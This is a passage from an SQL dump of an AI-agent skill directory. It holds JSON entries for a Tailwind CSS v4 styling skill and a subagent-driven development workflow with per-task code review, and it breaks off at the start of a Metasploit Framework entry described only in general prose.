ts, working with gradients, spacing, layout, flex, grid, responsive design, dark mode, colors, typography, or borders; or when the user mentions CSS, styling, classes, Tailwind, restyle, hero section, cards, buttons, or any visual/UI changes.","bodyPreview":"# Tailwind CSS Development\n\n## When to Apply\n\nActivate this skill when:\n\n- Adding styles to components or pages\n- Working with responsive design\n- Implementing dark mode\n- Extracting repeated patterns into components\n- Debugging spacing or layout issues\n\n## Documentation\n\nUse `search-docs` for detailed Tailwind CSS v4 patterns and documentation.\n\n## Basic Usage\n\n- Use Tailwind CSS classes to style HTML. Check and follow existing Tailwind conventions in the project before introducing new patterns","body":"# Tailwind CSS Development\n\n## When to Apply\n\nActivate this skill when:\n\n- Adding styles to components or pages\n- Working with responsive design\n- Implementing dark mode\n- Extracting repeated patterns into components\n- Debugging spacing or layout issues\n\n## Documentation\n\nUse `search-docs` for detailed Tailwind CSS v4 patterns and documentation.\n\n## Basic Usage\n\n- Use Tailwind CSS classes to style HTML. Check and follow existing Tailwind conventions in the project before introducing new patterns.\n- Offer to extract repeated patterns into components that match the project''s conventions (e.g., Blade, JSX, Vue).\n- Consider class placement, order, priority, and defaults. Remove redundant classes, add classes to parent or child elements carefully to reduce repetition, and group elements logically.\n\n## Tailwind CSS v4 Specifics\n\n- Always use Tailwind CSS v4 and avoid deprecated utilities.\n- `corePlugins` is not supported in Tailwind v4.\n\n### CSS-First Configuration\n\nIn Tailwind v4, configuration is CSS-first using the `@theme` directive — no separate `tailwind.config.js` file is needed:\n\n<!-- CSS-First Config -->\n```css\n@theme {\n  --color-brand: oklch(0.72 0.11 178);\n}\n```\n\n### Import Syntax\n\nIn Tailwind v4, import Tailwind with a regular CSS `@import` statement instead of the `@tailwind` directives used in v3:\n\n<!-- v4 Import Syntax -->\n```diff\n- @tailwind base;\n- @tailwind components;\n- @tailwind utilities;\n+ @import \"tailwindcss\";\n```\n\n### Replaced Utilities\n\nTailwind v4 removed deprecated utilities. Use the replacements shown below. Opacity values remain numeric.\n\n| Deprecated | Replacement |\n|------------|-------------|\n| bg-opacity-* | bg-black/* |\n| text-opacity-* | text-black/* |\n| border-opacity-* | border-black/* |\n| divide-opacity-* | divide-black/* |\n| ring-opacity-* | ring-black/* |\n| placeholder-opacity-* | placeholder-black/* |\n| flex-shrink-* | shrink-* |\n| flex-grow-* | grow-* |\n| overflow-ellipsis | text-ellipsis |\n| decoration-slice | box-decoration-slice |\n| decoration-clone | box-decoration-clone |\n\n## Spacing\n\nUse `gap` utilities instead of margins for spacing between siblings:\n\n<!-- Gap Utilities -->\n```html\n<div class=\"flex gap-8\">\n    <div>Item 1</div>\n    <div>Item 2</div>\n</div>\n```\n\n## Dark Mode\n\nIf existing pages and components support dark mode, new pages and components must support it the same way, typically using the `dark:` variant:\n\n<!-- Dark Mode -->\n```html\n<div class=\"bg-white dark:bg-gray-900 text-gray-900 dark:text-white\">\n    Content adapts to color scheme\n</div>\n```\n\n## Common Patterns\n\n### Flexbox Layout\n\n<!-- Flexbox Layout -->\n```html\n<div class=\"flex items-center justify-between gap-4\">\n    <div>Left content</div>\n    <div>Right content</div>\n</div>\n```\n\n### Grid Layout\n\n<!-- Grid Layout -->\n```html\n<div class=\"grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6\">\n    <div>Card 1</div>\n    <div>Card 2</div>\n    <div>Card 3</div>\n</div>\n```\n\n## Common Pitfalls\n\n- Using deprecated v3 utilities (bg-opacity-*, flex-shrink-*, etc.)\n- Using `@tailwind` directives instead of `@import \"tailwindcss\"`\n- Trying to use `tailwind.config.js` instead of CSS `@theme` directive\n- Using margins for spacing between siblings instead of gap utilities\n- Forgetting to add dark mode variants when the project uses dark mode"},"lastSynced":"2026-02-18T11:40:35.742Z","agentAnalysis":{"suitability":{"en":"Ideal for Frontend Agents requiring efficient CSS styling with Tailwind CSS v4 patterns and responsive design capabilities.","zh":"适用于需要高效CSS样式的前端代理，使用Tailwind CSS v4模式和响应式设计能力。","ja":"フロントエンドエージェントが効率的なCSSスタイリングを必要とする場合に適しています。Tailwind CSS v4パターンとレスポンシブデザイン機能を使用します。","ko":"효율적인 CSS 스타일이 필요한 프론트엔드 에이전트에 적합합니다. Tailwind CSS v4 패턴 및 반응형 디자인 기능을 사용합니다.","es":"Ideal para agentes frontend que requieren un estilo de CSS eficiente con patrones de Tailwind CSS v4 y capacidades de diseño responsivo.","fr":"Idéal pour les agents frontend nécessitant un style de CSS efficace avec des modèles de Tailwind CSS v4 et des capacités de conception réactive.","de":"Ideal für Frontend-Agents, die eine effiziente CSS-Stilisierung mit Tailwind-CSS-v4-Mustern und responsivem Design benötigen.","pt":"Ideal para Agentes Frontend que exigem estilização de CSS eficiente com padrões do Tailwind CSS v4 e capacidades de design responsivo.","ru":"Идеально для агентов Frontend, требующих эффективного стилизации CSS с помощью шаблонов Tailwind CSS v4 и возможностей адаптивного дизайна.","ar":"مثالي لعمليات الوكيل الأمامي التي تتطلب تنسيقًا فعالًا ل CSS باستخدام أنماط Tailwind CSS v4 وقدرات التصميم الاستجابي."},"recommendation":{"en":"Empowers agents to style HTML components using Tailwind CSS classes, leverage existing conventions, and implement dark mode with ease, while also debugging spacing or layout issues using `search-docs` for detailed documentation.","zh":"赋予代理使用Tailwind CSS类样式化HTML组件，利用现有的约定，并轻松实现暗黑模式，同时使用`search-docs`进行详细的文档调试间距或布局问题。","ja":"エージェントがTailwind CSSクラスを使用してHTMLコンポーネントをスタイル設定し、既存の規約を利用し、ダークモードを簡単に実装し、また`search-docs`を使用して詳細なドキュメントの調整を行い、間隔またはレイアウトの問題をデバッグします。","ko":"에이전트가 Tailwind CSS 클래스를 사용하여 HTML 컴포넌트를 스타일링하고 기존 규약을 활용하여 어둠 모드를 쉽게 구현하며, 또한 `search-docs`를 사용하여 자세한 문서를 디버깅하여 간격 또는 레이아웃 문제를 디버깅합니다.","es":"Permite a los agentes dar estilo a componentes HTML utilizando clases de Tailwind CSS, aprovechar convenciones existentes e implementar el modo oscuro con facilidad, y también depurar problemas de espaciado o diseño utilizando `search-docs` para obtener documentación detallada.","fr":"Permet aux agents de styliser des composants HTML à l''aide de classes Tailwind CSS, d''exploiter les conventions existantes et de mettre en œuvre le mode sombre avec facilité, et également de déboguer les problèmes d''espacement ou de disposition en utilisant `search-docs` pour obtenir une documentation détaillée.","de":"Ermöglicht es Agenten, HTML-Komponenten mit Tailwind-CSS-Klassen zu stylen, bestehende Konventionen zu nutzen und den Dunkelmodus mit Leichtigkeit zu implementieren, und auch Probleme mit Abständen oder Layouts zu debuggen, indem `search-docs` für detaillierte Dokumentation verwendet wird.","pt":"Habilita os agentes a estilizar componentes HTML usando classes do Tailwind CSS, aproveitar convenções existentes e implementar o modo escuro com facilidade, além de depurar problemas de espaçamento ou layout usando `search-docs` para documentação detalhada.","ru":"Наделяет агентов возможностью стилизовать компоненты HTML с помощью классов Tailwind CSS, использовать существующие соглашения и реализовывать темный режим с легкостью, а также отлаживать проблемы с пробелами или макетом с помощью `search-docs` для подробной документации.","ar":"تمكّن الوكلاء من تنسيق مكونات HTML باستخدام فئات Tailwind CSS، والاستفادة من الاتفاقيات الحالية وتنفيذ الوضع الداكن بسهولة، بالإضافة إلى تصحيح أخطاء المسافات أو تصميم التخطيط باستخدام `search-docs` للحصول على توثيق مفصل."},"useCases":{"en":["Adding styles to components or pages","Implementing responsive design and dark mode","Debugging spacing or layout issues","Extracting repeated patterns into reusable components"],"zh":["向组件或页面添加样式","实现响应式设计和暗黑模式","调试间距或布局问题","提取重复的模式到可重用的组件"],"ja":["コンポーネントまたはページにスタイルを追加する","レスポンシブデザインとダークモードを実装する","間隔またはレイアウトの問題をデバッグする","繰り返しのパターンを再利用可能なコンポーネントに抽出する"],"ko":["컴포넌트 또는 페이지에 스타일을 추가합니다","반응형 디자인 및 어둠 모드를 구현합니다","간격 또는 레이아웃 문제를 디버깅합니다","반복되는 패턴을 재사용 가능한 컴포넌트로 추출합니다"],"es":["Agregar estilos a componentes o páginas","Implementar diseño responsivo y modo oscuro","Depurar problemas de espaciado o diseño","Extraer patrones repetidos en componentes reutilizables"],"fr":["Ajouter des styles à des composants ou des pages","Mettre en œuvre une conception réactive et un mode sombre","Déboguer les problèmes d''espacement ou de disposition","Extraire des modèles répétitifs en composants réutilisables"],"de":["Stile hinzufügen zu Komponenten oder Seiten","Responsives Design und Dunkelmodus implementieren","Probleme mit Abständen oder Layouts debuggen","Wiederholte Muster in wiederverwendbare Komponenten extrahieren"],"pt":["Adicionar estilos a componentes ou páginas","Implementar design responsivo e modo escuro","Depurar problemas de espaçamento ou layout","Extrair padrões repetidos em componentes reutilizáveis"],"ru":["Добавление стилей к компонентам или страницам","Реализация адаптивного дизайна и темного режима","Отладка проблем с пробелами или макетом","Извлечение повторяющихся шаблонов в переиспользуемые компоненты"],"ar":["إضافة أنماط إلى المكونات أو الصفحات","تنفيذ التصميم الاستجابي والوضع الداكن","تصحيح أخطاء المسافات أو تصميم التخطيط","استخراج الأنماط المتكررة إلى مكونات قابلة لإعادة الاستخدام"]},"limitations":{"en":["Requires existing Tailwind CSS project setup","Tailwind CSS v4 compatibility"],"zh":["需要现有的Tailwind CSS项目设置","Tailwind CSS v4兼容性"],"ja":["既存のTailwind CSSプロジェクト設定が必要","Tailwind CSS v4の互換性"],"ko":["既存の Tailwind CSS 프로젝트 설정이 필요합니다","Tailwind CSS v4 호환성"],"es":["Requiere una configuración de proyecto de Tailwind CSS existente","Compatibilidad con Tailwind CSS v4"],"fr":["Nécessite une configuration de projet Tailwind CSS existante","Compatibilité avec Tailwind CSS v4"],"de":["Erfordert eine bestehende Tailwind-CSS-Projekt-Konfiguration","Kompatibilität mit Tailwind CSS v4"],"pt":["Exige configuração existente do projeto Tailwind CSS","Compatibilidade com o Tailwind CSS v4"],"ru":["Требует существующей настройки проекта Tailwind CSS","Совместимость с Tailwind CSS v4"],"ar":["يتطلب إعدادًا موجودًا لمشروع Tailwind CSS","متوافق مع Tailwind CSS v4"]},"version":3},"qualityScore":0}');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('apexbusiness-systems/APEX-OmniHub/subagent-driven-development', 'community', 'apexbusiness-systems', 'APEX-OmniHub', 'apexbusiness-systems/APEX-OmniHub', 'subagent-driven-development', 0, 0, 30, '2026-02-18T01:08:43.502Z', '2026-02-18T11:40:28.859Z', NULL, '{"id":"apexbusiness-systems/APEX-OmniHub/subagent-driven-development","name":"subagent-driven-development","description":{"zh":"子代理驱动开发是一种通过分配新子代理来执行任务并在每个任务后进行代码审查的开发方法，实现高质量和快速迭代","ja":"サブエージェント駆動開発は、新しいサブエージェントを割り当ててタスクを実行し、各タスク後にコードレビューを実施する開発方法であり、高品質と迅速なイテレーションを実現","ko":"서브 에이전트 주도 개발은 새로운 서브 에이전트를 할당하여 태스크를 실행하고, 각 태스크 후에 코드 리뷰를 수행하는 개발 방법으로, 고품질과 빠른 반복을 구현","es":"El desarrollo impulsado por subagentes es una técnica que permite ejecutar planes de manera eficiente, con una revisión de código después de cada tarea.","fr":"Le développement piloté par sous-agents est une technique qui permet d''exécuter des plans de manière efficace, avec une révision de code après chaque tâche.","de":"Die subagenten-getriebene Entwicklung ist eine Technik, die die effiziente Ausführung von Plänen ermöglicht, mit einer Code-Review nach jeder Aufgabe.","pt":"O desenvolvimento dirigido por subagentes é uma abordagem que executa planos por meio da criação de subagentes frescos para cada tarefa, com revisão de código após cada uma","ru":"Разработка на основе субагентов - это подход, который выполняет планы путем создания свежих субагентов для каждой задачи, с код-ревью после каждой","ar":"تطوير مدعوم بالوكلاء الفرعيين هو نهج ينفذ الخطط من خلال إنشاء وكلاء فرعيين جدد لكل مهمة، مع مراجعة الكود بعد كل واحدة","en":""},"seo":{"title":{"zh":"子代理驱动开发 - 快速迭代的核心原则","ja":"サブエージェント駆動開発 - 高品質の迅速なイテレーション","ko":"서브 에이전트 주도 개발 - 빠른 반복의 핵심 원칙","es":"Desarrollo impulsado por subagentes","fr":"Développement piloté par sous-agents","de":"Subagenten-getriebene Entwicklung","pt":"Desenvolvimento Dirigido por Subagentes","ru":"Разработка на основе субагентов","ar":"تطوير مدعوم بالوكلاء الفرعيين","en":"subagent-driven-development"},"description":{"zh":"子代理驱动开发是一种通过分配新子代理来执行任务并在每个任务后进行代码审查的开发方法，实现高质量和快速迭代","ja":"サブエージェント駆動開発は、新しいサブエージェントを割り当ててタスクを実行し、各タスク後にコードレビューを実施する開発方法であり、高品質と迅速なイテレーションを実現","ko":"서브 에이전트 주도 개발은 새로운 서브 에이전트를 할당하여 태스크를 실행하고, 각 태스크 후에 코드 리뷰를 수행하는 개발 방법으로, 고품질과 빠른 반복을 구현","es":"El desarrollo impulsado por subagentes es una técnica que permite ejecutar planes de manera eficiente, con una revisión de código después de cada tarea.","fr":"Le développement piloté par sous-agents est une technique qui permet d''exécuter des plans de manière efficace, avec une révision de code après chaque tâche.","de":"Die subagenten-getriebene Entwicklung ist eine Technik, die die effiziente Ausführung von Plänen ermöglicht, mit einer Code-Review nach jeder Aufgabe.","pt":"O desenvolvimento dirigido por subagentes é uma abordagem que executa planos por meio da criação de subagentes frescos para cada tarefa, com revisão de códig...","ru":"Разработка на основе субагентов - это подход, который выполняет планы путем создания свежих субагентов для каждой задачи, с код-ревью после каждой","ar":"تطوير مدعوم بالوكلاء الفرعيين هو نهج ينفذ الخطط من خلال إنشاء وكلاء فرعيين جدد لكل مهمة، مع مراجعة الكود بعد كل واحدة","en":""},"definition":{"en":""},"features":{"zh":["每个任务分配新子代理","任务之间进行代码审查","减少上下文切换","提高开发速度","保证代码质量"],"ja":["各タスクに新しいサブエージェントを割り当て","タスク間でコードレビューを実施","コンテキストスイッチを減らす","開発速度を向上させる","コード品質を保証"],"ko":["각 태스크에 새로운 서브 에이전트 할당","태스크 간에 코드 리뷰 수행","컨텍스트 스위치 감소","개발 속도 향상","코드 품질 보증"],"es":["Ejecución de planes de manera eficiente","Revisión de código después de cada tarea","Iteración más rápida sin intervención humana","No se produce contaminación de contexto","Cada tarea se ejecuta en una sesión diferente"],"fr":["Exécution de plans de manière efficace","Révision de code après chaque tâche","Itération plus rapide sans intervention humaine","Pas de pollution de contexte","Chaque tâche s''exécute dans une session différente"],"de":["Effiziente Ausführung von Plänen","Code-Review nach jeder Aufgabe","Schnellere Iteration ohne menschliche Intervention","Keine Kontextverunreinigung","Jede Aufgabe wird in einer separaten Sitzung ausgeführt"],"pt":["Criação de subagentes frescos para cada tarefa","Revisão de código após cada tarefa","Iteração mais rápida sem intervenção humana","Maior qualidade do código","Redução do contexto de switch"],"ru":["Создание свежих субагентов для каждой задачи","Код-ревью после каждой задачи","Быстрая итерация без вмешательства человека","Высокое качество кода","Сокращение контекстного переключения"],"ar":["إنشاء وكلاء فرعيين جدد لكل مهمة","مراجعة الكود بعد كل مهمة","تكرار أسرع بدون تداخل بشري","جودة أعلى للكود","تقليل التبديل السياقي"]},"keywords":{"zh":["子代理驱动开发","快速迭代","高质量开发","代码审查","开发方法","软件开发","编程"],"ja":["サブエージェント駆動開発","迅速なイテレーション","高品質開発","コードレビュー","開発手法","ソフトウェア開発","プログラミング"],"ko":["서브 에이전트 주도 개발","빠른 반복","고품질 개발","코드 리뷰","개발 기법","소프트웨어 개발","프로그래밍"],"es":["desarrollo impulsado por subagentes","técnica de desarrollo","eficiencia en el desarrollo","revisión de código","iteración rápida","subagentes","desarrollo de software","ingeniería de software"],"fr":["développement piloté par sous-agents","technique de développement","efficacité dans le développement","révision de code","itération rapide","sous-agents","développement de logiciels","ingénierie de logiciels"],"de":["subagenten-getriebene Entwicklung","Entwicklungstechnik","Effizienz in der Entwicklung","Code-Review","schnelle Iteration","Subagenten","Software-Entwicklung","Software-Ingenieurwesen"],"pt":["desenvolvimento dirigido por subagentes","subagentes","desenvolvimento de software","revisão de código","iteração rápida","qualidade do código","programação"],"ru":["разработка на основе субагентов","субагенты","разработка программного обеспечения","код-ревью","быстрая итерация","качество кода","программирование"],"ar":["تطوير مدعوم بالوكلاء الفرعيين","الوكلاء الفرعيين","تطوير البرمجيات","مراجعة الكود","تكرار سريع","جودة الكود","برمجة"]}},"owner":"apexbusiness-systems","repo":"APEX-OmniHub","repoPath":"apexbusiness-systems/APEX-OmniHub","stars":0,"forks":0,"updatedAt":"2026-02-18T01:08:43.502Z","topics":[],"category":"community","skillMd":{"name":"subagent-driven-development","description":"Use when executing implementation plans with independent tasks in the current session - dispatches fresh subagent for each task with code review between tasks, enabling fast iteration with quality gates","bodyPreview":"# Subagent-Driven Development\n\nExecute plan by dispatching fresh subagent per task, with code review after each.\n\n**Core principle:** Fresh subagent per task + review between tasks = high quality, fast iteration\n\n## Overview\n\n**vs. Executing Plans (parallel session):**\n- Same session (no context switch)\n- Fresh subagent per task (no context pollution)\n- Code review after each task (catch issues early)\n- Faster iteration (no human-in-loop between tasks)\n\n**When to use:**\n- Staying in this session","body":"# Subagent-Driven Development\n\nExecute plan by dispatching fresh subagent per task, with code review after each.\n\n**Core principle:** Fresh subagent per task + review between tasks = high quality, fast iteration\n\n## Overview\n\n**vs. Executing Plans (parallel session):**\n- Same session (no context switch)\n- Fresh subagent per task (no context pollution)\n- Code review after each task (catch issues early)\n- Faster iteration (no human-in-loop between tasks)\n\n**When to use:**\n- Staying in this session\n- Tasks are mostly independent\n- Want continuous progress with quality gates\n\n**When NOT to use:**\n- Need to review plan first (use executing-plans)\n- Tasks are tightly coupled (manual execution better)\n- Plan needs revision (brainstorm first)\n\n## The Process\n\n### 1. Load Plan\n\nRead plan file, create TodoWrite with all tasks.\n\n### 2. Execute Task with Subagent\n\nFor each task:\n\n**Dispatch fresh subagent:**\n```\nTask tool (general-purpose):\n  description: \"Implement Task N: [task name]\"\n  prompt: |\n    You are implementing Task N from [plan-file].\n\n    Read that task carefully. Your job is to:\n    1. Implement exactly what the task specifies\n    2. Write tests (following TDD if task says to)\n    3. Verify implementation works\n    4. Commit your work\n    5. Report back\n\n    Work from: [directory]\n\n    Report: What you implemented, what you tested, test results, files changed, any issues\n```\n\n**Subagent reports back** with summary of work.\n\n### 3. Review Subagent''s Work\n\n**Dispatch code-reviewer subagent:**\n```\nTask tool (superpowers:code-reviewer):\n  Use template at requesting-code-review/code-reviewer.md\n\n  WHAT_WAS_IMPLEMENTED: [from subagent''s report]\n  PLAN_OR_REQUIREMENTS: Task N from [plan-file]\n  BASE_SHA: [commit before task]\n  HEAD_SHA: [current commit]\n  DESCRIPTION: [task summary]\n```\n\n**Code reviewer returns:** Strengths, Issues (Critical/Important/Minor), Assessment\n\n### 4. Apply Review Feedback\n\n**If issues found:**\n- Fix Critical issues immediately\n- Fix Important issues before next task\n- Note Minor issues\n\n**Dispatch follow-up subagent if needed:**\n```\n\"Fix issues from code review: [list issues]\"\n```\n\n### 5. Mark Complete, Next Task\n\n- Mark task as completed in TodoWrite\n- Move to next task\n- Repeat steps 2-5\n\n### 6. Final Review\n\nAfter all tasks complete, dispatch final code-reviewer:\n- Reviews entire implementation\n- Checks all plan requirements met\n- Validates overall architecture\n\n### 7. Complete Development\n\nAfter final review passes:\n- Announce: \"I''m using the finishing-a-development-branch skill to complete this work.\"\n- **REQUIRED SUB-SKILL:** Use superpowers:finishing-a-development-branch\n- Follow that skill to verify tests, present options, execute choice\n\n## Example Workflow\n\n```\nYou: I''m using Subagent-Driven Development to execute this plan.\n\n[Load plan, create TodoWrite]\n\nTask 1: Hook installation script\n\n[Dispatch implementation subagent]\nSubagent: Implemented install-hook with tests, 5/5 passing\n\n[Get git SHAs, dispatch code-reviewer]\nReviewer: Strengths: Good test coverage. Issues: None. Ready.\n\n[Mark Task 1 complete]\n\nTask 2: Recovery modes\n\n[Dispatch implementation subagent]\nSubagent: Added verify/repair, 8/8 tests passing\n\n[Dispatch code-reviewer]\nReviewer: Strengths: Solid. Issues (Important): Missing progress reporting\n\n[Dispatch fix subagent]\nFix subagent: Added progress every 100 conversations\n\n[Verify fix, mark Task 2 complete]\n\n...\n\n[After all tasks]\n[Dispatch final code-reviewer]\nFinal reviewer: All requirements met, ready to merge\n\nDone!\n```\n\n## Advantages\n\n**vs. Manual execution:**\n- Subagents follow TDD naturally\n- Fresh context per task (no confusion)\n- Parallel-safe (subagents don''t interfere)\n\n**vs. Executing Plans:**\n- Same session (no handoff)\n- Continuous progress (no waiting)\n- Review checkpoints automatic\n\n**Cost:**\n- More subagent invocations\n- But catches issues early (cheaper than debugging later)\n\n## Red Flags\n\n**Never:**\n- Skip code review between tasks\n- Proceed with unfixed Critical issues\n- Dispatch multiple implementation subagents in parallel (conflicts)\n- Implement without reading plan task\n\n**If subagent fails task:**\n- Dispatch fix subagent with specific instructions\n- Don''t try to fix manually (context pollution)\n\n## Integration\n\n**Required workflow skills:**\n- **writing-plans** - REQUIRED: Creates the plan that this skill executes\n- **requesting-code-review** - REQUIRED: Review after each task (see Step 3)\n- **finishing-a-development-branch** - REQUIRED: Complete development after all tasks (see Step 7)\n\n**Subagents must use:**\n- **test-driven-development** - Subagents follow TDD for each task\n\n**Alternative workflow:**\n- **executing-plans** - Use for parallel session instead of same-session execution\n\nSee code-reviewer template: requesting-code-review/code-reviewer.md\n"},"lastSynced":"2026-02-18T11:40:28.859Z","agentAnalysis":{"suitability":{"en":"Ideal for Autonomous Agents requiring efficient task execution and code review, such as Cursor, Windsurf, or Claude Code, leveraging fresh subagents per task","zh":"适用于需要高效任务执行和代码审查的自主代理，例如Cursor、Windsurf或Claude Code，利用每个任务的新子代理","ja":"タスクの効率的な実行とコードレビューが必要な自律エージェントに適しています。たとえば、Cursor、Windsurf、またはClaude Codeのように、各タスクごとに新しいサブエージェントを利用します","ko":"효율적인 작업 실행 및 코드 검토가 필요한 자율 에이전트에 적합합니다. 예를 들어, Cursor, Windsurf 또는 Claude Code와 같이 각 작업에 свеж한 하위 에이전트를 활용합니다","es":"Ideal para Agentes Autónomos que requieren una ejecución de tareas eficiente y revisión de código, como Cursor, Windsurf o Claude Code, aprovechando subagentes frescos por tarea","fr":"Idéal pour les Agents Autonomes nécessitant une exécution de tâches efficace et une révision de code, tels que Cursor, Windsurf ou Claude Code, en exploitant des sous-agents frais par tâche","de":"Ideal für autonome Agenten, die eine effiziente Aufgabenbearbeitung und Code-Überprüfung erfordern, wie z.B. Cursor, Windsurf oder Claude Code, die frische Subagenten pro Aufgabe nutzen","pt":"Ideal para Agentes Autônomos que requerem execução de tarefas eficiente e revisão de código, como Cursor, Windsurf ou Claude Code, aproveitando subagentes frescos por tarefa","ru":"Идеально подходит для автономных агентов, требующих эффективного выполнения задач и проверки кода, таких как Cursor, Windsurf или Claude Code, использующих свежих субагентов для каждой задачи","ar":"مثالي للوكلاء المستقلين الذين يحتاجون إلى تنفيذ مهمات فعال ومراجعة رمز، مثل Cursor أو Windsurf أو Claude Code، باستخدام وكلاء فرعيين جدد لكل مهمة"},"recommendation":{"en":"Empowers agents to execute plans by dispatching fresh subagents per task, utilizing code review after each task for high-quality, fast iteration, and reducing context pollution, while supporting faster development cycles with protocols like parallel sessions","zh":"赋予代理执行计划的能力，通过为每个任务分派新子代理，利用每个任务后的代码审查以实现高质量的快速迭代，并减少上下文污染，同时支持更快的开发周期，使用诸如并行会话之类的协议","ja":"エージェントに計画を実行する能力を与え、各タスクごとに新しいサブエージェントを派遣し、各タスク後のコードレビューを使用して、高品質の迅速なイテレーションを実現し、コンテキスト汚染を減らし、並列セッションなどのプロトコルを使用して、より迅速な開発サイクルをサポートする","ko":"에이전트가 계획을 실행할 수 있는 능력을 부여하여 각 작업에 새로운 하위 에이전트를派遣하고 각 작업 후에 코드 검토를 사용하여 높은 품질의 빠른 반복을 구현하고 컨텍스트 오염을 줄이며 병렬 세션과 같은 프로토콜을 사용하여 더 빠른 개발 주기를 지원합니다","es":"Habilita a los agentes a ejecutar planes mediante el envío de subagentes frescos por tarea, utilizando la revisión de código después de cada tarea para una iteración rápida y de alta calidad, y reduciendo la contaminación del contexto, al mismo tiempo que admite ciclos de desarrollo más rápidos con protocolos como sesiones paralelas","fr":"Permet aux agents d''exécuter des plans en envoyant des sous-agents frais par tâche, en utilisant la révision de code après chaque tâche pour une itération rapide et de haute qualité, et en réduisant la pollution du contexte, tout en supportant des cycles de développement plus rapides avec des protocoles tels que des sessions parallèles","de":"Ermöglicht es Agenten, Pläne durch den Einsatz frischer Subagenten pro Aufgabe auszuführen, Code-Überprüfung nach jeder Aufgabe für eine schnelle und hochwertige Iteration zu nutzen und Kontextverschmutzung zu reduzieren, während gleichzeitig schnellere Entwicklungszyklen mit Protokollen wie parallelen Sitzungen unterstützt werden","pt":"Habilita os agentes a executar planos enviando subagentes frescos por tarefa, utilizando revisão de código após cada tarefa para iteração rápida e de alta qualidade, e reduzindo a poluição de contexto, ao mesmo tempo em que suporta ciclos de desenvolvimento mais rápidos com protocolos como sessões paralelas","ru":"Наделяет агентов возможностью выполнять планы, отправляя свежих субагентов для каждой задачи, используя проверку кода после каждой задачи для высококачественной и быстрой итерации, и сокращая контекстное загрязнение, а также поддерживая более быстрые циклы разработки с помощью протоколов, таких как параллельные сеансы","ar":"يمنح الوكلاء khảية تنفيذ الخطط من خلال إرسال وكلاء فرعيين جدد لكل مهمة، واستخدام مراجعة الرمز بعد كل مهمة للحصول على تكرار سريع وعالية الجودة، وتقليل تلوث السياق، مع دعم دورات التطوير الأسرع باستخدام بروتوكولات مثل الجلسات المتوازية"},"useCases":{"en":["Executing plans with fresh subagents for reduced context switching","Implementing code review after each task for early issue detection","Enhancing iteration speed by minimizing human-in-loop interventions between tasks"],"zh":["使用新子代理执行计划以降低上下文切换","在每个任务后实施代码审查以进行早期问题检测","通过最小化任务之间的人类干预来提高迭代速度"],"ja":["新しいサブエージェントを使用して計画を実行し、コンテキストの切り替えを減らす","各タスク後にコードレビューを実施して、早期の問題検出を実現する","タスク間の人間による介入を最小限に抑えることでイテレーションの速度を高める"],"ko":["새로운 하위 에이전트를 사용하여 계획을 실행하고 컨텍스트 전환을 줄입니다","각 작업 후에 코드 검토를 구현하여 초기 문제 감지를 구현합니다","작업 사이의 인간의 개입을 최소화하여 반복의 속도를 높입니다"],"es":["Ejecutar planes con subagentes frescos para reducir el cambio de contexto","Implementar la revisión de código después de cada tarea para la detección temprana de problemas","Mejorar la velocidad de iteración minimizando las intervenciones humanas entre tareas"],"fr":["Exécuter des plans avec des sous-agents frais pour réduire le commutateur de contexte","Mettre en œuvre la révision de code après chaque tâche pour la détection précoce des problèmes","Améliorer la vitesse d''itération en minimisant les interventions humaines entre les tâches"],"de":["Pläne mit frischen Subagenten ausführen, um den Kontextwechsel zu reduzieren","Code-Überprüfung nach jeder Aufgabe implementieren, um Probleme frühzeitig zu erkennen","Die Iterationssgeschwindigkeit verbessern, indem die menschlichen Eingriffe zwischen den Aufgaben minimiert werden"],"pt":["Executando planos com subagentes frescos para reduzir a troca de contexto","Implementando revisão de código após cada tarefa para detecção antecipada de problemas","Aumentando a velocidade de iteração minimizando intervenções humanas entre tarefas"],"ru":["Выполнение планов с использованием свежих субагентов для снижения переключения контекста","Реализация проверки кода после каждой задачи для раннего обнаружения проблем","Повышение скорости итерации за счет минимизации вмешательства человека между задачами"],"ar":["تنفيذ الخطط مع وكلاء فرعيين جدد لتقليل تبديل السياق","تنفيذ مراجعة الرمز بعد كل مهمة للكشف المبكر عن المشكلات","تعزيز سرعة التكرار bằng تقليل التدخلات البشرية بين المهام"]},"limitations":{"en":["Requires same session for task execution","No support for human-in-loop interventions between tasks"],"zh":["需要相同的会话来执行任务","不支持任务之间的人类干预"],"ja":["タスクの実行には同じセッションが必要","タスク間の人間による介入はサポートされていない"],"ko":["작업을 실행하려면 동일한 세션이 필요합니다","작업 사이의 인간의 개입은 지원되지 않습니다"],"es":["Requiere la misma sesión para la ejecución de tareas","No admite intervenciones humanas entre tareas"],"fr":["Nécessite la même session pour l''exécution des tâches","N''offre pas de support pour les interventions humaines entre les tâches"],"de":["Benötigt die gleiche Sitzung für die Aufgabenbearbeitung","Bietet keine Unterstützung für menschliche Eingriffe zwischen den Aufgaben"],"pt":["Requer a mesma sessão para execução de tarefas","Sem suporte para intervenções humanas entre tarefas"],"ru":["Требует одну и ту же сессию для выполнения задач","Нет поддержки для вмешательства человека между задачами"],"ar":["يتطلب الجلسة نفسها لتنفيذ المهام","بدون دعم للتدخلات البشرية بين المهام"]},"version":3},"qualityScore":30}');
INSERT OR REPLACE INTO skills (id, category, owner, repo, repo_path, name, stars, forks, quality_score, updated_at, last_synced, content_hash, data_json) VALUES ('claudiodearaujo/Sistema-de-narra-o-de-livro-front/Metasploit Framework', 'community', 'claudiodearaujo', 'Sistema-de-narra-o-de-livro-front', 'claudiodearaujo/Sistema-de-narra-o-de-livro-front', 'Metasploit Framework', 0, 0, 70, '2026-02-18T01:08:43.502Z', '2026-02-18T11:40:30.728Z', NULL, '{"id":"claudiodearaujo/Sistema-de-narra-o-de-livro-front/Metasploit Framework","name":"Metasploit Framework","description":{"zh":"Metasploit ","ja":"Metasploit","ko":"Metasploit ","es":"El Metasploit Framework es una plataforma integral para pruebas de penetración y seguridad. Ofrece herramientas para explotar vulnerabilidades, generar payloads y mantener el acceso a sistemas comprometidos.","fr":"Le Metasploit Framework est une plateforme complète pour les tests de pénétration et de sécurité. Il propose des outils pour exploiter les vulnérabilités, générer des payloads et maintenir l''accès aux systèmes compromis.","de":"Das Metasploit Framework ist eine umfassende Plattform für Penetrationstests und Sicherheitsprüfungen. Es bietet Tools zur Ausnutzung von Schwachstellen, zur Generierung von Payloads und zum Aufrechterhalten des Zugriffs auf kompromittierte Systeme.","pt":"O Metasploit Framework é uma plataforma unificada para exploração de vulnerabilidades 